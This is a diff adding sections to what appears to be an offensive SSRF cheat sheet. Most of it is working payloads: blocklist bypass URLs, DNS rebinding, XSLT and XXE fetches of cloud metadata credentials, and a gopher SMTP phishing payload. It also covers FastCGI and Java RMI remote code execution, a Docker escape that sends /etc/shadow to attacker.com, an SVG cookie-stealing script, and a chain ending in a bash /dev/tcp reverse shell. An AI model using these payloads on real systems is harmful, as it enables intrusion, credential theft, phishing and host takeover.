@@ -543,11 +543,417 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
 
 ---
 
+## Domain-Based Bypass Services
+
+### nip.io / localtest.me / localh.st / sslip.io
+
+```
+# These services resolve to the IP embedded in the subdomain
+# Bypass string-based blocklists that never do DNS validation
+
+http://127.0.0.1.nip.io/           # resolves to 127.0.0.1
+http://127.0.0.1.nip.io:8080/admin
+http://169.254.169.254.nip.io/     # resolves to IMDS
+http://10.0.0.1.nip.io/            # internal RFC-1918 target
+
+# localtest.me always resolves to 127.0.0.1
+http://localtest.me/
+http://admin.localtest.me:8080/
+
+# sslip.io — same concept, alternative service
+http://127.0.0.1.sslip.io/
+```
+
+**Root cause:** Allowlist check compares the hostname string to a blocklist but never resolves it. The service's DNS entry is what the server actually connects to.
+
+**Bypass logic:** Attacker-controlled subdomain makes the DNS response point to 127.0.0.1 — the string itself passes the filter check.
+
+---
+
+### 1u.ms Advanced DNS Rebinding
+
+```
+# 1u.ms: creates a domain that alternates between two IPs on successive lookups
+# More reliable and precise than singularity.me or rbndr.us
+
+# Format: make-<IP1>-rebind-<IP2>-rr.1u.ms
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+
+# First resolution → your VPS (passes allow-check)
+# Second resolution → 169.254.169.254 (IMDS hit)
+```
+
+**Root cause:** App resolves domain once for validation and again for the actual request — TOCTOU. The TTL is set to 0, so the second lookup gets a different IP.
+
+**Bypass logic:** Round-robin DNS flips between the attacker IP (for validation pass) and the internal target IP (for actual request).
+
+---
+
+## HTTP 307/308 Redirect — Method + Body Preservation
+
+```
+# 301/302 redirects change POST → GET (RFC compliant)
+# 307/308 redirects PRESERVE method and body through the redirect
+
+# Attack setup:
+# 1. Host a page at https://attacker.com/ssrf that returns:
+#    HTTP/1.1 307 Temporary Redirect
+#    Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#
+# 2. Submit SSRF with: url=https://attacker.com/ssrf
+# 3. App follows redirect → POST hits IMDS with original body intact
+# 4. Works for apps that only follow redirects to https:// domains
+
+# Redirect-as-a-service (no self-hosting needed):
+# r3dir.me provides 307 redirect: https://r3dir.me/#to=<TARGET>
+
+https://r3dir.me/#to=http://169.254.169.254/latest/meta-data/
+```
+
+**Root cause:** App validates the initial URL (allowlisted domain / HTTPS) but follows redirects without re-validating the final destination.
+
+**Bypass logic:** Wrap an internal target behind a 307 redirect on a trusted/allowlisted domain. The app validates the redirect source, not the redirect destination.
+
+**Stack:** Any framework that follows redirects by default — Python `requests`, Java `HttpURLConnection`, Node `axios`, Ruby `Net::HTTP`.
+
+---
+
+## URL Encoding Bypasses
+
+### Full Hostname URL-Encoding
+
+```
+# URL-encode the entire hostname string
+http://%6c%6f%63%61%6c%68%6f%73%74/          # "localhost"
+http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/  # "169.254.169.254"
+
+# Double-encoded
+http://%25%36c%25%36f%25%36...
+
+# Mixed: encode only some chars
+http://%6cocal%68ost/
+```
+
+**Root cause:** Filter does string comparison against a blocklist but doesn't URL-decode before comparing.
+
+### Backslash @ Parser Discrepancy
+
+```
+# Different HTTP libraries parse the authority component differently
+# urllib2 treats \ as part of path; requests treats it as authority separator
+http://127.1.1.1:80\@127.2.2.2:80/
+
+# Result: some libraries connect to 127.2.2.2, others to 127.1.1.1
+# Useful when allowlist checks the parsed host from one library,
+# but the actual request uses a different one
+```
+
+**Root cause:** RFC 3986 doesn't define `\` behavior in authority — implementations diverge. Server validates URL with Library A (sees 127.1.1.1), HTTP client uses Library B (connects to 127.2.2.2).
+
+---
+
+## XSLT / XML Parser SSRF
+
+```xml
+<!-- XSLT document() function fetches an external/internal URL during transform -->
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+<!-- xsl:import / xsl:include also trigger outbound requests -->
+<xsl:import href="http://attacker.com/malicious.xsl"/>
+
+<!-- XXE → SSRF chain: XXE reads file:// or triggers http:// fetch -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<foo>&xxe;</foo>
+
+<!-- xsl:document() with internal service -->
+<xsl:value-of select="document('http://localhost:9200/')"/>
+```
+
+**Root cause:** XSLT processors (libxslt, Xalan, Saxon) execute `document()` at transform time. Applications that accept user-supplied XSLT (report templates, data transformations) are directly exploitable.
+
+**Attack chain:** SSRF → IMDS credential theft (AWS) OR SSRF → internal Elasticsearch/Redis discovery
+
+**Stack:** Java (Saxon, Xalan), PHP (XSLTProcessor), Python (lxml), Ruby (Nokogiri).
+
+---
+
+## OAuth redirect_uri / jwks_uri SSRF
+
+```
+# OAuth AS fetches redirect_uri to validate (some naive implementations)
+POST /oauth/authorize
+client_id=app&redirect_uri=http://169.254.169.254/latest/meta-data/&...
+
+# jwks_uri: AS fetches the JWKS endpoint to verify JWT signature
+# If attacker can register a client with arbitrary jwks_uri:
+POST /oauth/register
+{"jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+# metadata_url in SAML / OIDC discovery
+POST /saml/metadata
+metadata_url=http://169.254.169.254/
+
+# request_uri parameter (OAuth PAR): server fetches the request object
+POST /oauth/authorize
+request_uri=http://169.254.169.254/latest/user-data
+```
+
+**Root cause:** OAuth/OIDC specs require servers to fetch several URLs (JWKS, metadata, request objects). Developers implement these fetches without blocking internal IP ranges.
+
+**Attack chain:** SSRF → IMDS or internal API → credential theft → account takeover
+
+**Stack:** Keycloak, Auth0, IdentityServer, any custom OAuth AS, OpenID Connect providers.
+
+---
+
+## SMTP via Gopher → Internal Mail Spoofing
+
+```
+# Send arbitrary email through internal SMTP (typically 127.0.0.1:25)
+# Most internal SMTP relays don't authenticate local connections
+
+gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cadmin%40target.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0D%0ADATA%0D%0AFrom%3A%20admin%40target.com%0D%0ATo%3A%20victim%40target.com%0D%0ASubject%3A%20Password%20Reset%0D%0A%0D%0AClick%20here%3A%20http%3A%2F%2Fattacker.com%2Freset%0D%0A.%0D%0AQUIT%0D%0A
+
+# Decoded gopher payload:
+HELO localhost
+MAIL FROM:<admin@target.com>
+RCPT TO:<victim@target.com>
+DATA
+From: admin@target.com
+To: victim@target.com
+Subject: Password Reset
+
+Click here: http://attacker.com/reset
+.
+QUIT
+```
+
+**Root cause:** Internal SMTP relays typically accept unauthenticated connections from localhost. Gopher's arbitrary TCP payload capability turns SSRF into an email injection primitive.
+
+**Attack chain:** SSRF → internal SMTP → phishing email from trusted corporate sender → credential harvest
+
+**Stack:** Postfix, Sendmail, Exim on localhost — any app in a corporate network with internal mail relay.
+
+---
+
+## FastCGI via Gopher → PHP RCE
+
+```
+# PHP-FPM/FastCGI runs on port 9000 by default — no authentication
+# Gopher payload sets PHP_VALUE env vars to enable RCE
+
+# Generate with Gopherus:
+python3 gopherus.py --exploit fastcgi
+# → enter PHP file path (e.g., /var/www/html/index.php) → enter command → copy payload
+
+# Raw concept — FCGI_PARAMS injection:
+# PHP_VALUE: allow_url_include=On  + auto_prepend_file=php://input
+# + request body containing PHP code
+
+gopher://127.0.0.1:9000/_%01%01...FCGI_PARAMS...PHP_VALUE=auto_prepend_file%3D%2Fetc%2Fpasswd...
+
+# Alternative via PHP env var injection:
+# PHP_ADMIN_VALUE=extension_dir + extension=/tmp/evil.so
+```
+
+**Root cause:** FastCGI protocol has no authentication by default. PHP-FPM bound to 0.0.0.0:9000 or 127.0.0.1:9000 accepts arbitrary PHP environment variable injection, which controls execution behavior.
+
+**Attack chain:** SSRF → FastCGI port 9000 → arbitrary PHP execution → OS command → shell
+
+**Stack:** PHP-FPM + nginx (extremely common deployment), any PHP app with php-fpm.
+
+---
+
+## Java RMI via Gopher → Deserialization RCE
+
+```
+# Java RMI registry default port: 1099
+# Gopher sends crafted deserialization payload to trigger ysoserial gadget chain
+
+# Using remote-method-guesser (rmg) + SSRF:
+# 1. Discover RMI registry: dict://127.0.0.1:1099/
+# 2. Send ysoserial payload via gopher:
+gopher://127.0.0.1:1099/_<URL-ENCODED-YSOSERIAL-PAYLOAD>
+
+# Generate payload:
+java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/rce" | xxd -p | tr -d '\n'
+# URL-encode and prepend to gopher:// URL
+
+# Alternatively: JMX on port 9010 accepts serialized objects over HTTP
+gopher://127.0.0.1:9010/...
+```
+
+**Root cause:** Java RMI uses Java serialization for all communication. Unauthenticated RMI registries (common in legacy enterprise apps) accept any deserialization payload. Gopher delivers raw TCP bytes needed for the RMI handshake.
+
+**Attack chain:** SSRF → RMI:1099 → ysoserial payload → OS command execution → shell
+
+**Stack:** Java enterprise apps (JBoss, WebLogic, old Spring apps), anything running `rmiregistry`.
+
+---
+
+## CVE-Based SSRF Targets
+
+### WebLogic UDDI Explorer (CVE-2014-4210)
+
+```
+# WebLogic UDDI Explorer component makes server-side HTTP requests
+GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:8080/
+
+# CVE-2020-14883: WebLogic console SSRF
+GET /console/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPageGeneral&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("http://127.0.0.1:9200/")
+```
+
+### Confluence SSRF (CVE-2017-9506)
+
+```
+# iconUriServlet in Confluence / JIRA acts as an open proxy
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/
+```
+
+### Jira SSRF (CVE-2019-8451)
+
+```
+# makeRequest servlet — unauthenticated in affected versions
+GET /plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/
+```
+
+### Hystrix Dashboard SSRF (CVE-2020-5412)
+
+```
+# Spring Cloud Netflix Hystrix Dashboard proxy endpoint
+GET /proxy.stream?origin=http://169.254.169.254/latest/meta-data/
+```
+
+### Apache Solr SSRF (shards parameter)
+
+```
+# Solr's distributed search "shards" parameter triggers server-side HTTP requests
+GET /solr/collection/select?q=*:*&shards=http://169.254.169.254/latest/meta-data/
+GET /solr/collection/select?q=*:*&shards=http://attacker.com:80/
+```
+
+**Root cause:** All of these expose URL-accepting parameters or servlets without proper SSRF controls. The vulnerable endpoints are reachable without authentication in many deployments, making internal Confluence/Jira/Solr instances prime targets when reached via SSRF from another SSRF-vulnerable service.
+
+---
+
+## Docker Daemon API → Container Escape + Host RCE
+
+```
+# Docker daemon on port 2375 (HTTP, unauthenticated) is exposed in dev/misconfigured envs
+# SSRF to Docker API → create privileged container → mount host filesystem → host RCE
+
+# Step 1: Verify Docker API accessible
+http://127.0.0.1:2375/version
+
+# Step 2: List containers/images
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2375/images/json
+
+# Step 3: Create privileged container mounting host / 
+# POST /containers/create (via gopher):
+gopher://127.0.0.1:2375/_POST%20/containers/create%20HTTP/1.1%0D%0A...
+# Body:
+{
+  "Image": "alpine",
+  "Cmd": ["chroot", "/mnt", "bash", "-c", "curl http://attacker.com/?$(cat /etc/shadow | base64)"],
+  "HostConfig": {
+    "Binds": ["/:/mnt"],
+    "Privileged": true
+  }
+}
+
+# Step 4: Start container
+# POST /containers/<id>/start
+
+# Full automation: Gopherus docker module or use SSRFmap
+python3 ssrfmap.py -r request.txt -p url -m docker
+```
+
+**Root cause:** Docker daemon TCP socket on 2375 has no authentication by default. Privileged containers with host filesystem mounts provide full host access.
+
+**Attack chain:** SSRF → Docker:2375 → privileged container create → host filesystem read/write → full host RCE
+
+---
+
+## EKS Node Metadata
+
+```
+# EKS (Elastic Kubernetes Service) nodes are EC2 instances
+# They expose BOTH standard EC2 IMDS AND EKS-specific metadata
+
+# EC2 IMDS on EKS node — contains bootstrap credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# EKS-specific: node bootstrap token (used to join cluster)
+# Found in user-data during cluster formation:
+http://169.254.169.254/latest/user-data   # may contain --token or bootstrap scripts
+
+# EKS node IAM role typically has:
+# - ec2:Describe* permissions (enumerate entire VPC)
+# - ecr:GetAuthorizationToken (pull private container images)
+# - May have broader permissions depending on node group config
+
+# EKS Pod Identity (newer, replaces IRSA in some configs):
+# Credential URI is injected via AWS_CONTAINER_CREDENTIALS_FULL_URI env var
+# Fetch from inside pod: GET $AWS_CONTAINER_CREDENTIALS_FULL_URI
+# Common value: http://169.254.170.23/v1/credentials
+
+# IMDS hop from pod → node:
+# If pod has host network or misconfigured network policy, IMDS is reachable
+```
+
+**Root cause:** EKS nodes are EC2 instances with IAM roles. Pod-level SSRF that reaches 169.254.169.254 gets node-level AWS credentials, not just pod-level ones. EKS Pod Identity endpoint `169.254.170.23` is newer and less filtered.
+
+**Attack chain:** SSRF in EKS pod → node IMDS → EC2 IAM role creds → ECR image pull + EC2 enumeration → lateral movement
+
+---
+
+## SVG SSRF → XSS Escalation
+
+```xml
+<!-- SVG files support external resource loading and script execution -->
+<!-- Upload or inject an SVG with an external reference: -->
+
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink">
+
+  <!-- SSRF: server fetches external URL when processing SVG -->
+  <image href="http://169.254.169.254/latest/meta-data/" x="0" y="0" height="100" width="100"/>
+
+  <!-- XSS if SVG is rendered in browser (not sanitized) -->
+  <script>fetch('https://attacker.com/x?'+document.cookie)</script>
+
+  <!-- Blind SSRF via SVG filter with external reference -->
+  <filter id="f">
+    <feImage href="http://attacker-oob.com/callback"/>
+  </filter>
+</svg>
+```
+
+**Root cause:** Image processing pipelines (ImageMagick, Inkscape, rsvg) resolve external `href` attributes server-side when rasterizing SVGs. When the SVG is rendered in-browser (e.g., as an avatar), embedded `<script>` tags execute.
+
+**Attack chain (SSRF):** SVG upload → server-side render → `<image href>` fetches internal URL → SSRF
+
+**Attack chain (XSS):** SVG stored as avatar/attachment → rendered in browser without sanitization → `<script>` executes → XSS → ATO
+
+**Stack:** ImageMagick (server-side), any app that stores and serves user SVGs inline.
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Update each session.
+> Current patterns as of 2026-05-23. Update each session.
 
-**What's being exploited in the wild:**
+**What's being exploited in the wild (2026-05-23):**
 
 1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
    #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
@@ -558,17 +964,35 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
    ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
    and inherited deployments keep it alive. Always try IMDSv1 first.
 
-3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`) and K8s
-   service account tokens (`file:///var/run/secrets/...`) are the most impactful
-   targets. Both yield short-lived IAM credentials or cluster API access.
+3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`), EKS node
+   IMDS (`169.254.169.254` with node-level role), EKS Pod Identity (`169.254.170.23`),
+   and K8s service account tokens (`file:///var/run/secrets/...`) are the most impactful
+   targets. All yield short-lived IAM credentials or cluster API access.
 
 4. **Webhook features as SSRF entry points** — Every app that allows users to configure
    webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
    webhook + IMDSv1 = critical AWS credential theft.
 
 5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
-   block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
-   to reach internal services via `http://`.
+   block `gopher://`. Pivot to `dict://` for Redis INFO, chain through 307/308 redirects
+   (method-preserving), or chain through open redirects to reach internal services.
+
+6. **OAuth/OIDC metadata fetching is an emerging class** — `jwks_uri`, `redirect_uri`,
+   and `request_uri` parameters in OAuth flows trigger server-side fetches. Authorization
+   servers that accept user-registered clients are especially vulnerable. Low-hanging fruit
+   on platforms that implement custom OAuth servers.
+
+7. **Domain bypass services (nip.io / 1u.ms) make filter bypass trivial** — Most
+   blocklist-based SSRF defenses do hostname string matching, not DNS pre-resolution.
+   nip.io and sslip.io make this bypass one URL away, no infrastructure needed.
+
+8. **XSLT/XML processors as SSRF vectors** — Report generation, data transformation,
+   and document conversion features frequently use XSLT. The `document()` function in
+   XSLT triggers outbound HTTP — attacker-supplied XSLT templates mean direct SSRF.
+
+9. **FastCGI on port 9000 is underreported** — PHP-FPM bound to all interfaces (common
+   misconfiguration) combined with SSRF equals PHP RCE via Gopherus. High-impact, low
+   awareness among defenders.
 
 ---
 
@@ -582,11 +1006,16 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
 | Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
 | Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
 | Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
+| Follows redirects but checks method | 307/308 redirect to preserve POST + body | r3dir.me for hosted redirect |
 | PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
 | Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
 | TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
 | DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
 | IMDSv2 required | gopher:// with PUT headers or redirect chain | Multi-step token fetch |
+| String blocklist (no DNS check) | `127.0.0.1.nip.io` or `127.0.0.1.sslip.io` | Domain resolves to blocked IP |
+| Hostname string compare | `http://%6c%6f%63%61%6c%68%6f%73%74/` | URL-encode hostname before compare |
+| Multi-library parsing | `http://127.1.1.1:80\@127.2.2.2:80/` | Backslash @ discrepancy |
+| XML/XSLT processing | `document('http://169.254.169.254/')` in XSLT | Processor fetches at transform time |
 
 ---
 
@@ -597,13 +1026,21 @@ gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
 | PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
 | Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
 | Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
-| OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
+| OAuth metadata URL (`jwks_uri`, `redirect_uri`, `request_uri`) | Server fetches to validate token issuer | SSRF to IMDS or internal APIs |
 | Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
-| XML parsers with `xs:import` or XSLT | URL fetched during parsing | Blind SSRF from file processing |
+| XSLT / XSL transformation endpoint | `document()` fetches URLs at transform time | Blind SSRF from data pipeline |
 | Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
 | Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
+| PHP-FPM FastCGI at `127.0.0.1:9000` | No auth, accepts env var injection | gopher → PHP RCE |
 | Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
 | ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
+| EKS `169.254.170.23` Pod Identity | Node/pod-level IAM credentials | AWS EC2 + ECR pivot |
+| Docker daemon `127.0.0.1:2375` | Unauthenticated container API | Privileged container → host RCE |
+| Confluence `iconUriServlet` (CVE-2017-9506) | Acts as open HTTP proxy | SSRF to internal metadata |
+| Jira `makeRequest` servlet (CVE-2019-8451) | Unauthenticated in affected versions | SSRF to internal APIs |
+| WebLogic UDDI Explorer (CVE-2014-4210) | Server-side request with user URL | SSRF → internal port scan |
+| Apache Solr `shards` param | Distributed search fetches remote shards | SSRF → internal data exfil |
+| SVG upload / avatar / attachment | ImageMagick resolves `href` server-side | Blind SSRF + XSS if browser-rendered |
 
 ---
 
@@ -684,4 +1121,68 @@ Impact: Critical — RCE via internal Jenkins
 5. Pivot to a different AWS account in the organization
 
 Impact: Critical — cross-account AWS access
+```
+
+### Chain 6: OAuth jwks_uri SSRF → IMDS → Token Forgery
+
+```
+1. App implements custom OAuth AS that accepts dynamic client registration
+2. Register a client with jwks_uri pointing to IMDS:
+   POST /oauth/register
+   {"client_name":"evil","jwks_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+3. AS fetches jwks_uri to cache public keys → SSRF triggered
+4. Response body (IAM credentials) returned in error message or logs
+5. Use stolen credentials → AWS CLI → enumerate secrets
+6. Optional: forge JWTs signed with HMAC using stolen secret if AS falls back to symmetric
+
+Impact: Critical — IAM credential theft via OAuth registration endpoint
+Stack: Keycloak, custom OAuth2 implementations, Identity Server
+```
+
+### Chain 7: XSLT Template Injection → Internal API Read
+
+```
+1. App accepts user-uploaded XSLT templates for report generation
+2. Craft malicious XSLT:
+   <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+3. Upload via report template feature
+4. Trigger report generation
+5. XSLT processor (Saxon/Xalan) fetches IMDS → response embedded in output XML
+6. Parse rendered report for IAM credentials
+
+Impact: Critical — credential theft via document processing pipeline
+Stack: Java (Saxon, Xalan), PHP (XSLTProcessor), .NET (XslCompiledTransform)
+```
+
+### Chain 8: SSRF → FastCGI → PHP RCE → Reverse Shell
+
+```
+1. Find SSRF in imageUrl or similar parameter
+2. Confirm PHP-FPM at 127.0.0.1:9000 (check error vs timeout behavior)
+3. Find a PHP file on disk (check /index.php, /var/www/html/index.php via error messages)
+4. Generate FastCGI payload with Gopherus:
+   python3 gopherus.py --exploit fastcgi
+   → PHP file: /var/www/html/index.php
+   → Command: bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+5. Send gopher:// payload via SSRF parameter
+6. PHP-FPM executes command → reverse shell connects back
+
+Impact: Critical — RCE on server running PHP-FPM
+Stack: nginx + PHP-FPM (extremely common)
+```
+
+### Chain 9: nip.io Bypass → IMDS → S3 Bucket Takeover
+
+```
+1. App validates URL: blocks "169.254.169.254" as string, blocks "127.0.0.1"
+2. App does NOT resolve the hostname before comparing against blocklist
+3. Use nip.io bypass:
+   url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/
+4. String check passes (no blocked strings found)
+5. Server resolves 169.254.169.254.nip.io → 169.254.169.254
+6. IMDS responds with IAM role name
+7. Fetch: http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/<ROLE>
+8. Extract AccessKeyId + SecretAccessKey + Token → aws s3 ls --all-buckets
+
+Impact: Critical — filter bypass + full IMDS access
 ```
